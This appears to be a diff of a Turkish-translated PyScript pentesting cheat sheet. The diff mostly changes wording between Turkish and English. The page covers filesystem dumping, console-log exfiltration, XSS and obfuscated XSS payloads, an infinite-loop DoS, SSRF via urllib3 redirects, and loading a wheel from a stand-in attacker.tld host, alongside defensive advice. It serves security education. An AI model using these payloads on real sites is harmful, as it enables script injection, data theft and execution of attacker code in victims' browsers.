@@ -1,14 +1,16 @@
 # Pyscript
 
-## PyScript Pentesting Rehberi
+{{#include ../../banners/hacktricks-training.md}}
 
-PyScript, Python'u HTML'e entegre etmek için geliştirilmiş yeni bir framework'tür; böylece HTML ile birlikte kullanılabilir. Bu cheat sheet'te PyScript'i penetration testing amaçlarınız doğrultusunda nasıl kullanacağınızı bulabilirsiniz.
+## PyScript Pentesting Guide
 
-### Emscripten sanal bellek dosya sisteminden dosya dökümü alma / dosyaları geri getirme:
+PyScript, Python'ı HTML'e entegre etmek için geliştirilmiş yeni bir framework'tür; bu nedenle HTML ile birlikte kullanılabilir. Bu cheat sheet'te, PyScript'i penetration testing amaçlarınız doğrultusunda nasıl kullanacağınızı bulabilirsiniz.
+
+### Emscripten sanal bellek dosya sisteminden dosyaları dump etme / alma:
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
-Code:
+Kod:
 ```html
 <py-script>
 with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
@@ -17,9 +19,9 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 ```
 Sonuç:
 
-![PyScript Pentesting Guide - Emscripten sanal bellek dosya sisteminden dosyaları dökme / alma: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+![PyScript Pentesting Guide - Emscripten sanal bellek dosya sisteminden dosya Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration'ı (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPkP5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration'ı (konsol izleme)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
@@ -47,11 +49,11 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 Sonuç:
 
-![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
+![Emscripten sanal bellek dosya sisteminden dosya dökümü alma / dosya getirme - Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration işlemi (konsol izleme): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
 ### Cross Site Scripting (Ordinary)
 
-Kod:
+Code:
 ```python
 <py-script>
 print("<img src=x onerror='alert(document.domain)'>")
@@ -59,7 +61,7 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 Sonuç:
 
-![Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration işlemi (konsol izleme) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
@@ -151,9 +153,9 @@ return _0x599c()
 ```
 Sonuç:
 
-![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Sonsuz döngü)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS saldırısı (Sonsuz döngü)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
-### DoS attack (Sonsuz döngü)
+### DoS saldırısı (Sonsuz döngü)
 
 Kod:
 ```html
@@ -164,7 +166,7 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 ```
 Sonuç:
 
-![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Sonsuz döngü):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
 ---
 
@@ -172,7 +174,7 @@ Sonuç:
 
 ### Server-Side Request Forgery via kontrolsüz yönlendirmeler (CVE-2025-50182)
 
-`urllib3 >= 2.2.0, < 2.5.0`, Pyodide'ın browser transport'u ile kullanıldığında `redirect` ve `retries` request parametrelerini göz ardı eder. Bir attacker hedef URL'leri etkileyebiliyorsa kod, urllib3'den bunları devre dışı bırakmasını istese bile cross-domain yönlendirmeleri takip edebilir ve bu durum SSRF savunmalarını zayıflatabilir.<sup>[[1]](#references)[[4]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0`, Pyodide'ın browser transport ile kullanıldığında `redirect` ve `retries` request parametrelerini yok sayar. Bir saldırgan hedef URL'leri etkileyebiliyorsa kod, urllib3'e bunları devre dışı bırakmasını söylese bile cross-domain redirects işlemlerini takip edebilir ve SSRF savunmalarını etkisizleştirebilir.<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
@@ -186,11 +188,11 @@ redirect=False,
 print(r.status, r.url)
 </script>
 ```
-Node.js için `urllib3 >= 2.5.0` sürümüne yükseltin; ancak tarayıcılarda yönlendirmeleri devre dışı bırakmak için urllib3'e güvenmeyin. Bunun yerine istek yapmadan önce hedefleri doğrulayın veya allow-list kullanın.<sup>[[4]](#references)</sup>
+Node.js için `urllib3 >= 2.5.0` sürümüne yükseltin; ancak tarayıcılarda yönlendirmeleri devre dışı bırakmak için urllib3'e güvenmeyin. Bunun yerine, istek yapmadan önce hedefleri doğrulayın veya izin verilenler listesine alın.<sup>[[4]](#references)</sup>
 
 ### Arbitrary package loading & supply-chain attacks
 
-PyScript'in Pyodide yapılandırması, `packages` içinde rastgele wheel URL'lerini kabul eder; bir saldırgan bu yapılandırmayı değiştirebilir veya buna müdahale edebilirse sonraki bir import, saldırganın kontrolündeki Python kodunu kurbanın tarayıcısında çalıştırabilir.<sup>[[5]](#references)[[6]](#references)</sup>
+PyScript'in Pyodide yapılandırması `packages` içinde rastgele wheel URL'lerini kabul eder; bir saldırgan bu yapılandırmayı değiştirebilir veya yapılandırmaya müdahale edebilirse sonraki bir import, saldırganın kontrolündeki Python kodunu kurbanın tarayıcısında çalıştırabilir.<sup>[[5]](#references)[[6]](#references)</sup>
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
@@ -199,12 +201,12 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code at import
 </script>
 ```
-Pyodide, paketin WebAssembly derlemesi olmadan rastgele URL'lerden pure-Python wheel'lerini yükleyebilir.<sup>[[6]](#references)</sup> Bu yapılandırmayı geliştirici kontrolünde tutun, tam paket adlarını veya URL'leri allow-list'e ekleyin ve uzak wheel özetlerini build veya deployment sırasında doğrulayın.
+Pyodide, paketin WebAssembly derlemesi olmadan rastgele URL'lerden pure-Python wheel'lerini yükleyebilir.<sup>[[6]](#references)</sup> Bu yapılandırmayı geliştirici kontrollü tutun, tam paket adlarını veya URL'leri allow-list'e ekleyin ve derleme ya da deployment sırasında uzak wheel'lerin digest değerlerini doğrulayın.
 
-### Output sanitisation changes (2023+)
+### Çıktı sanitizasyonu değişiklikleri (2023+)
 
-* Eski örneklerde kullanılan 2022.05.1 uygulamasında `print()`, HTML escaping uygulamadan `text/plain` çıktısı yazar ve bu nedenle XSS açığına açıktır.<sup>[[8]](#references)</sup>
-* Güncel `display()` helper'ı, plain string'ler için varsayılan olarak HTML'i escape eder; raw markup, `pyscript.HTML()` içine sarılmalıdır.<sup>[[2]](#references)</sup>
+* Eski örneklerde kullanılan 2022.05.1 uygulamasında `print()`, HTML escaping uygulamadan `text/plain` çıktısı yazar ve bu nedenle XSS'e açıktır.<sup>[[8]](#references)</sup>
+* Güncel `display()` helper'ı, düz string'ler için varsayılan olarak HTML'i **escape eder**; ham markup, `pyscript.HTML()` içine sarılmalıdır.<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
 
@@ -212,26 +214,26 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-`display()` öğesini güvenilmeyen girdiler için kullanın ve güvenilmeyen dizeleri `HTML()` öğesine aktarmayın.<sup>[[2]](#references)</sup>
+Güvenilmeyen input için `display()` kullanın ve güvenilmeyen string'leri `HTML()` öğesine geçirmeyin.<sup>[[2]](#references)</sup>
 
 ---
 
-## Savunma İçin En İyi Uygulamalar
+## Defensive Best Practices
 
-* **Paketleri güncel tutun** – Node.js içinde `urllib3 >= 2.5.0` kullanın ve tarayıcı yönlendirmelerine ilişkin varsayımları ayrıca gözden geçirin.<sup>[[4]](#references)</sup>
-* **Paket kaynaklarını kısıtlayın** – PyPI adlarını veya tam güvenilir URL'leri allow-list'e ekleyin ve derleme ya da deployment sırasında uzak wheel özetlerini doğrulayın.<sup>[[5]](#references)[[6]](#references)</sup>
-* **Content Security Policy'yi güçlendirin** – enjekte edilen `<script>` bloklarının çalıştırılamaması için satır içi JavaScript'i (`script-src 'self' 'sha256-…'`) engelleyin.
+* **Paketleri güncel tutun** – Node.js'te `urllib3 >= 2.5.0` kullanın ve tarayıcı yönlendirmesi varsayımlarını ayrıca gözden geçirin.<sup>[[4]](#references)</sup>
+* **Paket kaynaklarını kısıtlayın** – PyPI adlarını veya tam olarak güvenilen URL'leri allow-list'e ekleyin ve uzak wheel özetlerini build veya deployment sırasında doğrulayın.<sup>[[5]](#references)[[6]](#references)</sup>
+* **Content Security Policy'yi güçlendirin** – enjekte edilen `<script>` bloklarının çalışamaması için satır içi JavaScript'i (`script-src 'self' 'sha256-…'`) engelleyin.
 * **Kullanıcı tarafından sağlanan `<py-script>` / `<script type="py">` etiketlerine izin vermeyin** – diğer kullanıcılara geri göndermeden önce HTML'i sunucuda sanitize edin.
-* **Worker'ları izole edin** – worker'lardan DOM'a senkron erişime ihtiyacınız yoksa `sync_main_only` flag'ini etkinleştirerek `SharedArrayBuffer` kullanımını ve bununla ilişkili CORS header gereksinimlerini önleyin.<sup>[[5]](#references)</sup>
+* **Worker'ları izole edin** – worker'ların DOM'a senkron erişimine ihtiyacınız yoksa `SharedArrayBuffer`'ı ve bununla ilişkili CORS header gereksinimlerini önlemek için `sync_main_only` flag'ini etkinleştirin.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-- [2] [PyScript yerleşik işlevler dokümantasyonu – `display` ve `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
-- [3] [Cyber Guy - Güvenlik Açığı Zincirleme Sanatı (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
-- [4] [urllib3 güvenlik duyurusu – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
-- [5] [PyScript yapılandırma dokümantasyonu – paketler ve `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
-- [6] [Pyodide – Paketleri yükleme](https://pyodide.org/en/stable/usage/loading-packages.html)
+- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
+- [5] [PyScript configuration documentation – packages and `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [6] [Pyodide – Loading packages](https://pyodide.org/en/stable/usage/loading-packages.html)
 - [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
-- [8] [PyScript 2022.05.1 `pyscript.py` uygulaması](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
+- [8] [PyScript 2022.05.1 `pyscript.py` implementation](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
 {{#include ../../banners/hacktricks-training.md}}
